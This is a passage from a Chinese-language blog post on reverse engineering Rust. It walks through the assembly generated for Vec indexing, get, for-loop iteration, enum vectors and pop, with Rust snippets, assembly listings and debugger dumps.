<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_5:</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_6]</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::ops::index::Index&lt;I&gt;&gt;::index@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 40]</span><br><span class="line">        mov     esi, 2</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        jmp     .LBB33_6</span><br></pre></td></tr></table></figure>
<p>这是加<code>&amp;</code>的汇编代码，第一个参数就是<code>Vec</code>实例地址，第二个参数是索引值，第三个参数疑似指向工程名的字符串切片，推测是在索引越界后输出错误信息用的。这里实际上是调用了<code>index</code>方法进行索引。这个<code>index</code>函数的返回值是一个地址，如果加了<code>&amp;</code>，则直接对指针进行操作，如果不加则会直接解引用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; 不加&amp;</span><br><span class="line">.LBB32_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 16]</span><br><span class="line">        mov     eax, dword ptr [rax]</span><br><span class="line">        mov     dword ptr [rsp + 68], eax</span><br><span class="line">        lea     rax, [rsp + 68]</span><br><span class="line"></span><br><span class="line">; 加&amp;</span><br><span class="line">.LBB33_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 16]</span><br><span class="line">        mov     qword ptr [rsp + 64], rax</span><br><span class="line">        lea     rax, [rsp + 64]</span><br></pre></td></tr></table></figure>
<p>第二种元素访问的方法是使用<code>get</code>方法：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x.<span class="title function_ invoke__">get</span>(<span class="number">2</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.LBB35_5:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::ops::deref::Deref&gt;::deref@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 72]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 40], rdx</span><br><span class="line">        mov     qword ptr [rsp + 48], rax</span><br><span class="line">        jmp     .LBB35_6</span><br><span class="line">.LBB35_6:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 40]</span><br><span class="line">        mov     rdi, qword ptr [rsp + 48]</span><br><span class="line">        mov     rax, qword ptr [rip + core::slice::&lt;impl [T]&gt;::get@GOTPCREL]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        jmp     .LBB35_7</span><br><span class="line">.LBB35_7:</span><br><span class="line">        mov     rdi, qword ptr [rsp + 32]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">        mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        jmp     .LBB35_8</span><br></pre></td></tr></table></figure>
<p>使用<code>get</code>函数前，会首先调用<code>deref</code>方法解引用获取动态数组类型中保存的定长数组实例，随后对这个实例使用<code>get</code>方法获取<code>Option&lt;T&gt;</code>实例。可见如果使用<code>get</code>方法进行数组的越界访问，那么<code>get</code>方法返回后不会立即<code>panic!</code>退出。</p>
<h2 id="元素遍历"><a class="markdownIt-Anchor" href="#元素遍历"></a> 元素遍历</h2>
<p>对于动态数组，要遍历数组中的元素，只需要使用for循环即可完成。但Rust源码看着简单，实际在汇编层完成的工作可不少。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> x &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.LBB46_5:</span><br><span class="line">        mov     byte ptr [rsp + 247], 0</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsp + 112], rax</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + 40]</span><br><span class="line">        movaps  xmmword ptr [rsp + 96], xmm0</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        lea     rsi, [rsp + 96]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB46_6</span><br><span class="line">.LBB46_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp + 128], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsp + 136], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 144], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 88]</span><br><span class="line">        mov     qword ptr [rsp + 152], rax</span><br><span class="line">.LBB46_7:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::into_iter::IntoIter&lt;T,A&gt; as core::iter::traits::iterator::Iterator&gt;::next@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 128]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     dword ptr [rsp + 16], edx</span><br><span class="line">        mov     dword ptr [rsp + 20], eax</span><br><span class="line">        jmp     .LBB46_10</span><br></pre></td></tr></table></figure>
<p>上面即为<code>for</code>循环的其中一段，其中<code>[rsp+40]</code>是<code>Vec</code>实例的地址。首先可以看到程序将<code>Vec</code>实例复制了一份，随后调用了<code>into_iter</code>方法获取了一个迭代器实例，该方法的第一个参数为需要初始化迭代器的地址，第二个参数为复制的<code>Vec</code>的地址。这个方法是可以单独调用的，返回一个迭代器：<code>fn into_iter(self) -&gt; Self::IntoIter</code>。从下面的汇编代码（复制到<code>[rsp+128]</code>）可以得知，这个迭代器实例在栈中的大小为0x20。下面是这个迭代器在调试时获取的最初状态：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">08:0040│ rax rcx 0x7fffffffd840 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">09:0048│         0x7fffffffd848 ◂— 0x6</span><br><span class="line">0a:0050│         0x7fffffffd850 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">0b:0058│         0x7fffffffd858 —▸ 0x5555555b4bb0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>其中第1个和第3个字保存的都是数组的起始地址，第4个字保存的是数组的末尾地址，第2个字的6保存的是数组的容量，注意这里的容量与数组长度不同，数组长度为4，但容量为6，只不过后面2个元素暂时还未被创建。</p>
<p>往下，代码调用了<code>next</code>方法，获取迭代器中的下一个元素，下面是调用后迭代器的状态：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10:0080│ rcx rdi 0x7fffffffd880 —▸ 0x5555555b4ba0 ◂— 0x200000001</span><br><span class="line">11:0088│         0x7fffffffd888 ◂— 0x6</span><br><span class="line">12:0090│         0x7fffffffd890 —▸ 0x5555555b4ba4 ◂— 0x300000002</span><br><span class="line">13:0098│         0x7fffffffd898 —▸ 0x5555555b4bb0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>可以看到第三个字表示的实际上就是当前的指针。<code>next</code>方法返回的是一个<code>Option&lt;T&gt;</code>实例，索引值和数据分别被保存在<code>rax</code>和<code>rdx</code>中。这一点在下面的汇编代码中得以证实。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.LBB46_10:</span><br><span class="line">        mov     eax, dword ptr [rsp + 16]</span><br><span class="line">        mov     ecx, dword ptr [rsp + 20]</span><br><span class="line">        mov     dword ptr [rsp + 164], ecx</span><br><span class="line">        mov     dword ptr [rsp + 168], eax</span><br><span class="line">        mov     eax, dword ptr [rsp + 164]</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        jne     .LBB46_12</span><br><span class="line">        mov     rax, qword ptr [rip + core::ptr::drop_in_place&lt;alloc::vec::into_iter::IntoIter&lt;i32&gt;&gt;@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 128]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB46_13</span><br></pre></td></tr></table></figure>
<p>下面的代码中进行了一个比较，通过数据流分析可以发现这里是将<code>next</code>返回值与0进行比较，在<code>Option&lt;T&gt;</code>中，如果<code>T</code>不是一个枚举类型，那么枚举索引值为1表示有效值，0则表示无效值。随后就是正常的宏展开与输出，输出内容后无条件跳转回<code>next</code>方法调用前，继续调用<code>next</code>方法获取下一个值。</p>
<p>当<code>next</code>方法调用失败，即已经到达迭代器的终点时，通过调试发现，返回的<code>rax</code>值为0，<code>rdx</code>值为0x5555。后续则是判断失败后跳出循环。</p>
<p>注意，上面的代码是<code>for i in x</code>，这里的x由于没有使用引用，在<code>for</code>循环一开始就丧失了所有权，其所有权会被转移到迭代器中，当<code>for</code>循环结束后，迭代器被销毁，后续将不能使用变量<code>x</code>。</p>
<p>如果使用<code>for i in &amp;x</code>，情况则会有些许的不同，<strong>不仔细观察还真的容易忽略</strong>。</p>
<p>注意看，下面是两个<code>into_iter</code>方法在IDA反汇编界面中的函数名：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_$LT$$RF$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::hed888fce85d317be</span><br><span class="line"></span><br><span class="line">_$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::he37dcd381eb06c85</span><br></pre></td></tr></table></figure>
<p>可能你会纳闷：这里为啥会有这么多<code>$</code>符号？实际上，这是IDA用于表示某些标点符号的转义字符，这个转义的规则与Javascript类似。<code>$LT$</code>表示<code>&lt;</code>，<code>$GT$</code>表示<code>&gt;</code>，<code>$RF$</code>表示<code>&amp;</code>，<code>$C$</code>表示<code>,</code>，<code>$u??$</code>表示<code>\x??</code>。因此上面的函数名就等同于：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter::hed888fce85d317be</span><br><span class="line"></span><br><span class="line">&lt;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter::he37dcd381eb06c85</span><br></pre></td></tr></table></figure>
<p>上面那个是<code>for i in &amp;x</code>调用的方法，下面是<code>for i in x</code>调用的方法，除了后面的哈希值之外，函数名真的只有一个<code>&amp;</code>的差别。也即上面的方法是针对<code>&amp;Vec</code>，下面的是针对<code>Vec</code>。二者的参数不同，上面那个只有1个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_5:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 32], rdx</span><br><span class="line">        mov     qword ptr [rsp + 40], rax</span><br><span class="line">        jmp     .LBB33_6</span><br></pre></td></tr></table></figure>
<p>即<code>Vec</code>实例的地址。</p>
<p>且二者的返回值也不同，对于<code>&lt;&amp;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter</code>，其返回值保存在<code>rax</code>和<code>rdx</code>中，其中<code>rax</code>为数组的开始地址，<code>rdx</code>为数组的结束地址。实际返回的迭代器的大小也只有16个字节。</p>
<p><code>for i in &amp;x</code>后面的汇编代码段如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 32]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsp + 88], rcx</span><br><span class="line">        mov     qword ptr [rsp + 96], rax</span><br><span class="line">.LBB33_7:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;core::slice::iter::Iter&lt;T&gt; as core::iter::traits::iterator::Iterator&gt;::next@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 88]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        jmp     .LBB33_8</span><br><span class="line">.LBB33_8:</span><br><span class="line">        mov     rax, qword ptr [rsp + 24]</span><br><span class="line">        mov     qword ptr [rsp + 104], rax</span><br><span class="line">        mov     rdx, qword ptr [rsp + 104]</span><br><span class="line">        mov     eax, 1</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        cmp     rdx, 0</span><br><span class="line">        cmove   rax, rcx</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        jne     .LBB33_10</span><br></pre></td></tr></table></figure>
<p>可以看到这里调用的<code>next</code>方法也和不加<code>&amp;</code>的不一样，参数只有1个，即数组的开始地址，返回值只有1个，即下一个元素的地址，该函数调用后，迭代器中的指针位置向前移动。可见对于引用类型的迭代器结构更为简单，只需要一个动态指针和一个结束指针即可，什么时候动态指针等于结束指针，迭代也就结束。</p>
<h2 id="枚举数组"><a class="markdownIt-Anchor" href="#枚举数组"></a> 枚举数组</h2>
<p>对于元素类型是枚举类型的数组，目前只有一个疑问：当枚举类型中不同枚举项所跟的数据类型不同，占用内存大小不同时，Rust将如何进行处理。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Shapes</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Round</span>(<span class="type">f64</span>),</span><br><span class="line">    <span class="title function_ invoke__">Rectangle</span>(<span class="type">f64</span>, <span class="type">f64</span>),</span><br><span class="line">    <span class="title function_ invoke__">Triangle</span>(<span class="type">f64</span>, <span class="type">f64</span>, <span class="type">f64</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Round</span>(<span class="number">3.5</span>),</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Rectangle</span>(<span class="number">7.5</span>, <span class="number">9.6</span>),</span><br><span class="line">        Shapes::<span class="title function_ invoke__">Triangle</span>(<span class="number">114.514</span>, <span class="number">19.1981</span>, <span class="number">1.57</span>)</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 136</span><br><span class="line">        mov     edi, 96</span><br><span class="line">        mov     esi, 8</span><br><span class="line">        call    alloc::alloc::exchange_malloc</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_5]</span><br><span class="line">        movsd   qword ptr [rsp + 48], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 40], 0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_4]</span><br><span class="line">        movsd   qword ptr [rsp + 80], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_3]</span><br><span class="line">        movsd   qword ptr [rsp + 88], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 72], 1</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_2]</span><br><span class="line">        movsd   qword ptr [rsp + 112], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_1]</span><br><span class="line">        movsd   qword ptr [rsp + 120], xmm0</span><br><span class="line">        movsd   xmm0, qword ptr [rip + .LCPI10_0]</span><br><span class="line">        movsd   qword ptr [rsp + 128], xmm0</span><br><span class="line">        mov     qword ptr [rsp + 104], 2</span><br><span class="line">        and     rax, 7</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        sete    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB10_1</span><br><span class="line">        jmp     .LBB10_2</span><br><span class="line">.LBB10_1:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 8]</span><br><span class="line">        mov     rax, qword ptr [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsi], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 48]</span><br><span class="line">        mov     qword ptr [rsi + 8], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsi + 16], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsi + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsi + 32], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsi + 40], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 88]</span><br><span class="line">        mov     qword ptr [rsi + 48], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 96]</span><br><span class="line">        mov     qword ptr [rsi + 56], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 104]</span><br><span class="line">        mov     qword ptr [rsi + 64], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 112]</span><br><span class="line">        mov     qword ptr [rsi + 72], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 120]</span><br><span class="line">        mov     qword ptr [rsi + 80], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 128]</span><br><span class="line">        mov     qword ptr [rsi + 88], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        call    qword ptr [rip + alloc::slice::&lt;impl [T]&gt;::into_vec@GOTPCREL]</span><br></pre></td></tr></table></figure>
<p>可以看到，Rust编译器似乎很喜欢通过大量的<code>mov</code>系列指令完成内存复制操作，在上面的示例中可以发现，Rust是将枚举类型可能占用的最大内存大小作为数组一个元素的大小进行存储，在下面的内存拷贝操作中甚至还拷贝了未被初始化的内存区域。我们可以将每一个枚举类型后面跟的值视作一个大的union结构，一个枚举类型的不同实例占用的内存大小相同，即使其中一个实例只保存了8字节而另一个实例保存了80字节，前者也需要80个字节的空间保存数据。这会造成一定的内存浪费，但便于数组索引寻址。</p>
<h2 id="弹出最后一个元素pop"><a class="markdownIt-Anchor" href="#弹出最后一个元素pop"></a> 弹出最后一个元素——pop</h2>
<p><code>Vec</code>的<code>pop</code>方法能够弹出数组中最后一个元素，并在数组中将其删除。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x.<span class="title function_ invoke__">pop</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.LBB31_5:</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::vec::Vec&lt;T,A&gt;::pop@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 32]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     dword ptr [rsp + 8], edx</span><br><span class="line">        mov     dword ptr [rsp + 12], eax</span><br><span class="line">        jmp     .LBB31_6</span><br><span class="line">.LBB31_6:</span><br><span class="line">        mov     esi, dword ptr [rsp + 8]</span><br><span class="line">        mov     edi, dword ptr [rsp + 12]</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_5]</span><br><span class="line">        mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB31_7</span><br></pre></td></tr></table></figure>
<p><code>pop</code>的参数只有一个，即<code>Vec</code>实例地址，返回值是<code>Option&lt;T&gt;</code>，<code>rdx</code>为有效值，<code>rax</code>为是否有效的索引值，1为有效。该方法调用后，数组的大小会变化，但容量不变，真正保存值的静态数组指针中的值也不变，而且也不需要改变，因为数组大小变小，所以后面的值在正常情况下无法访问。</p>
<p>在参考书中只给出了插入元素、获取元素、遍历元素等几个为数不多的<code>Vec</code>操作方法，但实际上<code>Vec</code>能完成的功能远不止于此，考虑到<code>Vec</code>的方法实在太多，这里无法全部完成分析，就先到这里了。不过我们已经掌握了<code>Vec</code>的基本结构，对于其他方法的分析也就万变不离其宗。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文我们学习了：</p>
<ol>
<li><code>Vec</code>动态数组结构在内存中的结构。</li>
<li><code>Vec</code>在最后添加、删除元素、遍历、访问值的相关方法分析。</li>
<li>IDA中对一些含有特殊字符的Rust方法的转义方式与Javascript类似。</li>
<li>枚举类型构成的数组中，每个枚举类型占用的内存大小相同，可能导致内存空间浪费。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
